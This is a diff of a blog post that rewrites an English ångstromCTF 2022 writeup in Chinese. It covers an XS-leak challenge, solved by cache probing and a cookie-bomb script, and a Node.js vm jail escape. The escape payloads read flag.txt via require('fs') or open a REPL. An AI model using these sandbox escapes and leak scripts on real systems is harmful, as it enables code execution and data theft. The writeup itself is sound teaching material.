@@ -1,23 +1,27 @@
 ---
-title: ångstromCTF 2022 Writeup
-date: 2022-05-05 17:43:37
+title: ångstromCTF 2022 筆記
+catalog: true
+date: 2022-05-05 20:36:04
 tags: [Security]
 categories: [Security]
 ---
-<img src="/img/angstrom-ctf-2022-writeup-en/cover-en.png" style="display:none">
 
-I didn't check all the challenges this time because when I joined the competition, most of the challenges already solved by my teammates lol
+<img src="/img/angstrom-ctf-2022-writeup/cover.png" style="display:none">
 
-I love JavaScript(yep, including those weird features) and XS-leak, so this writeup will talk about only two challenges:
+這次的比賽我第一天有事沒辦法參加，第二天參與時發現 web 的題目被隊友解的差不多了，所以有滿多題目沒去看的。
+
+因為我滿愛 JavaScript 跟 XS-leak，所以這篇只會記兩題我最有興趣的：
 
 1. web/Sustenance
 2. misc/CaaSio PSE
+
+（之後有機會再補另一題 DOMPurify + marked bypass 的 XSS）
 
 <!-- more -->
 
 ## web/Sustenance
 
-It's a very simple app:
+這是一個功能非常簡單的 App：
 
 ``` js
 const express = require("express");
@@ -81,41 +85,30 @@ app.listen(port, () => {
 });
 ```
 
-There are two features:
+你可以設置任意 cookie，也可以搜尋某些字元是否存在於 flag 當中，而這題沒有 XSS 的點又有搜尋功能，因此顯然是 XS-leak。
 
-1. You can set any cookie
-2. You can search whether certain characters exist in the flag
+既然是 XS-leak，就要觀察「有搜尋到」跟「沒搜尋到」的差別是什麼，搜尋的 query 長這樣：`/q?q=actf`，如果有搜尋到的話，會導到 `/?m=your search...at 1651732982748 has success....`，沒搜尋到的話會導到 `/?m=your search...ar 1651732982748 has failed`
 
-There is no way to perform XSS, so it's obviously a challenge about XS-leak.
+而 index.html 只會把網址列上 `m` 的內容 render 到畫面上，因此成功跟失敗的差異有兩個：
 
-Since it's XS-leak, we must observe what is the difference between "found" and "not found".
+1. 網址不同
+2. 頁面的內容不同
 
-The search query is like this: `/q?q=actf`, if it's found, it will redirect to`/?m=your search...at 1651732982748 has success....` and not found will redirect to`/?m=your search...ar 1651732982748 has failed`
+一開始我嘗試的方向是 cache probing，因為有造訪過的頁面會存進 disk cache，所以只要用 `fetch + force-cache` 的方式，就可以根據時間差來判斷是否在 cache 內。至於網址列上的 timestamp，直接設個爆搜的範圍就好，例如說 1~1000 之類的。
 
-There are two differences between success and failure:
+因為預設 SameSite=Lax 的關係，所以搜尋的時候只能用 `window.open` 這種 top-level navigation，否則 cookie 帶不出去。
 
-1. URL is different
-2. The content of the page is different
+而最大的問題是 Chrome 現在有 [cache partitioning](https://developer.chrome.com/blog/http-cache-partitioning/)，新開的頁面的 cache key 是：`(https://actf.co, https://actf.co, https://sustenance.web.actf.co/?m=xxx)`，但假設我自己開個 ngrok 裡面用 fetch，cache key 會是：`(https://myip.ngrok.io, https://myip.ngrok.io, https://sustenance.web.actf.co/?m=xxx)`，cache key 是不同的，所以抓不到 cache。
 
-At the beginning, the direction I tried was cache probing, because the visited pages will be stored in the disk cache, so as long as you use the method of `fetch with force-cache`, you can judge whether it is in the cache according to the time difference. As for the timestamp on the URL, just set a range such as 1~1000 to brute force.
+我跟隊友也有討論過既然可以設定 cookie，那是不是可以利用 [cookie bomb](https://blog.huli.tw/2021/07/10/cookie-bomb/) 來做事，但討論過後我們也沒找出什麼方法。
 
-Because of the default SameSite=Lax, you can only use `window.open` for top-level navigation when searching, otherwise the cookie will not be sent.
+接著我嘗試利用 [pbctf 2021 Vault](http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html) 中的方法，用 `a:visited` 去洩露 history，改了一下上面這篇的 POC 以後可以動，但丟去 admin bot 發現無效。自己在本機測了一下，發現應該是因為 headless 的關係，不管怎樣 render 的時間都是 16ms。
 
-The biggest problem is that Chrome now has cache partitioning, and the cache key of the newly opened page is: `(https://actf.co, https://actf.co, https://sustenance.web.actf.co/?m =xxx)`, but if I open an ngrok page and use fetch in it, the cache key will be: `(https://myip.ngrok.io, https://myip.ngrok.io, https://sustenance.web.actf .co/?m=xxx)`, the cache key is different, so the cache cannot be shared. You can find more detail here: [Gaining security and privacy by partitioning the cache](https://developer.chrome.com/blog/http-cache-partitioning/)
+試到沒什麼招了以後，[lebr0nli](https://lebr0nli.github.io/blog/) 貼了一個利用 cache probing 的 POC，是從 [maple 的 writeup](https://blog.maple3142.net/2021/10/11/pbctf-2021-writeups/#vault) 中看來的，而重點是「這個 POC 可以利用別的題目，藉此跑在 same site 上面」，例如說另一題的網址是 `https://xtra-salty-sardines.web.actf.co/`，從這邊用 fetch 的話，cache key 也會是 `(https://actf.co, https://actf.co, https://sustenance.web.actf.co/?m=xxx)`，因為 cache key 只看 eTLD+1，所以 same site 的網站，cache key 也會一樣。
 
-I also discussed with my teammates whether we can use the cookie bomb to do something since we can set cookies, but we didn't find any way to exploit after the discussion.
+但他碰到的問題是 local 可以跑，可是在 remote 上面怎麼樣都是 false positive。於是我照著他的 POC 改了一下，試著多回傳一些數字，發現問題出在 server 跑得異常的快。舉例來說，有 cache 的要 3ms，沒有 cache 的也只要 5ms，相差極少，連 timestamp 的部分也是，大概是 `window.open` 之後 10ms 以內。
 
-Then I tried to use the method in the [pbctf 2021 Vault](http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html), use `a:visited` to leak the history, but I found that it's not work in headless Chrome. It works in my local Chrome, but not in headless mode, the time to render the visited link is always fast(like 16ms).
-
-After a while, [lebr0nli](https://lebr0nli.github.io/blog/) posted a POC on the channel about cache probing, which is modified from [Maple's writeup](https://blog.maple3142.net/2021/10/11/pbctf-2021-writeups/#vault). The point is "we can use other same site domain to bypass cache partitioning".
-
-For example, the URL for the other challenge is `https://xtra-salty-sardines.web.actf.co/`, if you use fetch from that domain, the cache key will also be `(https://actf.co, https://actf.co, https://sustenance.web.actf.co/?m=xxx)` because cache key only take eTLD+1 into account. So same site, same cache key.
-
-The problem he encountered is that it works on local, but on remote it's always false positive. So I made another one based on  his POC, tried to send back some more data, and found that the problem was that the server was running pretty fast.
-
-For example, if there is a cache, it takes 3ms, and if there is no cache, it only takes 5ms. The difference is very small. Even the timestamp part is also within 10ms after `window.open`.
-
-Therefore, I modified the exploit script and calculated the average time of cache at the remote end, and successfully leaked the flag. The script is as follows:
+因此我修改了一下程式碼，直接在遠端計算有 cache 的平均時間，就順利 leak 出了 flag，程式碼如下：
 
 https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722
 
@@ -227,19 +220,17 @@ async function go() {
 }
 ```
 
-We can leak the charset first, and the speed will be much faster. There are still some parts that can be improved, and the speed should be faster.
+我們可以先 leak 出 charset，速度就會快很多。上面還有些小地方可以再調整的，整體速度應該會再更快。
 
-Later, teammates posted another writeup: [UIUCTF 2021- yana](https://ctf.zeyu2001.com/2021/uiuctf-2021/yana#this-shouldnt-have-worked), it seems that headless chrome has no cache partitioning at the moment.
+後來隊友也有貼了另外一篇 writeup：[UIUCTF 2021- yana](https://ctf.zeyu2001.com/2021/uiuctf-2021/yana#this-shouldnt-have-worked)，從中得知 headless chrome 目前是沒有 cache partitioning 的。
 
-I tested it myself and found that it is still the same now, so actually we don't need other same site domain. It still works if you put this exploit on your own website.
+我自己實際測了一下，發現到現在還是這樣，所以這題其實不需要借用其他題目，自己架個 ngrok 就可以搞定。
 
-### Intended
+### 預期解
 
-The intended solution should be the cookie bomb I mentioned above. First, set a lot of cookies, and then use the feature that the URL of success and failure are different.
+預期解應該就是我上面說過的 cookie bomb，先設置一大堆 cookie，然後利用成功跟失敗的 url 網址不同這個特性，如果成功的話 url 會比較長，request 就會太大，server 就會回錯誤，失敗的話就不會有事。
 
-If successful, the URL will be longer, the request will be too large to handle by the server so return an error http status code. If the search fails, nothing will happen because URL is short.
-
-The script below is from Strellic, you need to run it on another same site domain:
+底下的 script 來自 Strellic，一樣要借用其他題目來跑在 same site 上面：
 
 ``` html
 <>'";<form action='https://sustenance.web.actf.co/s' method=POST><input id=f /><input name=search value=a /></form>
@@ -290,15 +281,20 @@ The script below is from Strellic, you need to run it on another same site domai
 </script>
 ```
 
-Here are a few details to note:
+這邊有幾個細節要知道：
 
-1. If the request is too large, the server will return an error(status 413 or 431 I think)
-2. Because it is the same site, `<script>` will automatically carry a cookie when sending a request
-3. You can use the onload/onerror event of script to detect whether the http status code is successful or not
+1. request 太大的話 server 會回錯誤
+2. 因為是 same site，所以 `<script>` 發 request 時會自動帶 cookie
+3. 利用 script 的 event 來偵測 http status code 是不是成功
+
+當初卡關是因為：
+
+1. 沒想到可以利用其他題目來繞過 same site cookie
+2. 沒注意到 request URL 也包含在長度裡面，只想到 header/body
 
 ## misc/CaaSio PSE
 
-It's a jsjail with strong restrictions:
+這題是限制很嚴格的 js jail，題目長這樣：
 
 ``` js
 #!/usr/local/bin/node
@@ -342,65 +338,64 @@ interface.question(
 );
 ```
 
-It's east to bypass VM, we can use `this.constructor.constructor('return ...')()` . But the difficult part is about the limited charset, we can't use all string related symbol, also `.[]();>` is not allowed.
-
-After trying for a while, I recalled that we can use [with](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/with) to access property, like this:
+VM bypass 的部分很簡單，可以用 `this.constructor.constructor('return ...')()` 來搞定，但是難點在於限制的字元很多，字串相關的都不給用，`.` 跟 `[]` 也不行，`{};>` 也不行，卡了很多東西。嘗試一陣子之後想起用 [with](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/with) 也可以來存取屬性，像這樣：
 
 ``` js
 with(console)log(123)
 ```
 
-For string, we can use regexp to bypass, like this:`/string/.source`.
+字串的部分可以用 regexp 來繞，像這樣：`/string/.source`。
 
-I also thought about `decodeURI` but haven't try it, there are a lot of people solve it this way, like lebr0nli:
+做一做有想到是不是可以用 decodeURI 來繞一些字元，不過沒有仔細想，賽後發現很多人用這招來解，像是 lebr0nli 的：
 
 ``` js
 eval(unescape(/%2f%0athis%2econstructor%2econstructor(%22return(process%2emainModule%2erequire(%27fs%27)%2ereadFileSync(%27flag%2etxt%27,%27utf8%27))%22)%2f/))()
-```
+``` 
 
-If regexp is converted into a string, there will be one `/` at the start and the other at the end. We can solve this issue by adding `/\n` to the regexp, it will be combined with the previous one like this:
+regexp 如果直接變成字串，前後會有兩個 `/`，只要在 regexp 裡面加上 `/\n`，就會跟前面的結合變成這樣：
 
 ``` js
 //
 your_code_here
 ```
 
-The idea is similar to the [XSS challenge](https://blog.huli.tw/2022/02/14/en/intigriti-0222-author-writeup/) I made.
+概念跟我之前出的 [XSS challenge](https://blog.huli.tw/2022/02/14/en/intigriti-0222-author-writeup/) 其實滿類似的。
 
-Anyway, here is the basic structure for my payload:
+總之，我最後組出的 payload 框架長這樣：
 
 ``` js
 with(/console.log(1)/)with(this)with(constructor)constructor(source)()
 ```
 
-Just replace `console.log(1)` to the real code, the code we want to run is:
+只要把 `console.log(1)` 改成想跑的程式碼就行了，而我們想執行的程式碼是：
 
 ``` js
 return String(process.mainModule.require('fs').readFileSync('flag.txt'))
 ```
 
-`String()` is not required, just for better readability for the flag.
+轉成字串那個步驟不一定需要，只是讓 flag 可讀性更好而已。
 
-Then, we can use `with` to rewrite the code:
+
+接著可以利用 `with` 把上面的程式碼轉成：
 
 ``` js
 with(process)with(mainModule)with(require('fs'))return(String(readFileSync('flag.txt')))
 ```
 
-Since single quote is not allowed, we can make it a variable first, then think about how to remove it.
+由於不能有單引號，所以我們可以先把那些變成變數比較好讀，之後再來看怎麼拿掉：
 
 ``` js
 with(k='fs',n='flag.txt',process)with(mainModule)with(require(k))return(String(readFileSync(n)))
 ```
 
-Now, the last part is to generate a string. We can do it via `String.fromCharCode`:
+現在只需要產生出字串就好，可以用 `String.fromCharCode` 達到這件事：
 
 ``` js
 with(String)with(f=fromCharCode,k=f(102,115),n=f(102,108,97,103,46,116,120,116),process)
-with(mainModule)with(require(k))return(String(readFileSync(n)))
+with(mainModule)with(require(k))return(String(readFileSync(n))) // 這邊跟上面都一樣
 ```
 
-The final exploit just combined the code above with the structure, I formatted the code a bit for better readability:
+因此最後的 payload 就是把這段程式碼跟剛剛的框架拼在一起，我稍微排版一下比較好讀：
 
 ``` js
 with(
@@ -415,23 +410,22 @@ with(this)
     constructor(source)()
 ```
 
-### Other solutions
-
-I learned a lot from [Maple](https://blog.maple3142.net/2022/05/03/angstromctf-2022-writeups/)'s writeup, for example, we can use `with(a=source,/b/)` to deal with the shadowing problem.
+看了 [Maple](https://blog.maple3142.net/2022/05/03/angstromctf-2022-writeups/) 的 payload 才發現 with 巢狀會被蓋掉的方法可以用 `with(a=source,/b/)` 繞掉，舉例來說：
 
 ``` js
 with(/a/)with(/b/)console.log(source)
 ```
 
-You can only get `/b/.source`, not `/a/.source` because it's shadowed. We can solve this by assigning the value to a variable before next `with`:
+你只能拿到 `/b/.source`，拿不到 a 的，因為屬性同樣名稱。所以你可以這樣寫：
 
 ``` js
 with(/a/)with(a=source,/b/)console.log(a,source)
 ```
 
-Apart from these, he also uses `require('repl').start()` to start the repl mode, it's a very smart move because you can run any code without the length limit.
+直接在第二個 with 裡面先用 `a=source` 去拿到上一個 with 的屬性。
 
-Below is Maple's payload:
+除了 with 以外，還利用了 `require('repl').start()` 這個神奇的內建模組，簡單來說就是開啟 repl 模式，之後你想執行什麼就執行甚麼，可以擺脫字元的限制。底下是他的 payload：
+
 
 ``` js
 with(/with(process)with(mainModule)with(require(x))start()/)
@@ -442,7 +436,7 @@ with(/with(process)with(mainModule)with(require(x))start()/)
       constructor(s2,s1)(s3)
 ```
 
-Here is the payload from the author, the intended is without regexp:
+作者的解法是這樣，沒有用到 regexp：
 
 ``` js
 with(String)
@@ -454,9 +448,7 @@ with(String)
             readFileSync(f(102,108,97,103,46,t,120,t))
 ```
 
-This solution is smart because of the variable part. It uses variable to save the space.
-
-We can combined this with Maple's solution:
+這個解法利用了一堆暫存變數來節省字元，這招也很聰明，結合了 Maple 的解法的話就變成：
 
 ``` js
 with(String)
@@ -468,7 +460,7 @@ with(String)
             start()
 ```
 
-It can be shorter if we replace the first `constructor` to something else, we can search for the function in `Object.prototype`
+然後雖然大家很愛用 `this.constructor.constructor`，但理解原理就會知道第一個 `constructor` 只是為了拿到 function，可以找一下 object 上有哪些東西：
 
 ``` js
 for(let key of Object.getOwnPropertyNames((obj={}).__proto__)) {
@@ -478,15 +470,15 @@ for(let key of Object.getOwnPropertyNames((obj={}).__proto__)) {
 }
 ```
 
-The shortest is `valueOf`:
+最短的是 `valueOf`，所以可以再縮成這樣：
 
 ``` js
 with(String)with(f=fromCharCode,this)with(valueOf)with(constructor(f(r=114,e=101,116,117,r,110,32,p=112,r,111,99,e,s=115,s))())with(mainModule)with(require(f(r,e,p,108)))start()
 ```
 
-It's 177 in length.
+總共 177 個字元。
 
-For another kind of solution using `unescape`, I modified the payload from @fredd and got 115 in length in the end. 
+如果結合 Discord 中 fredd 的解法，有用到 regexp 的我找到最短的是這樣，115 個字：
 
 ``` js
 eval(unescape(1+/1,this%2evalueOf%2econstructor(%22process%2emainModule%2erequire(%27repl%27)%2estart()%22)()%2f/))
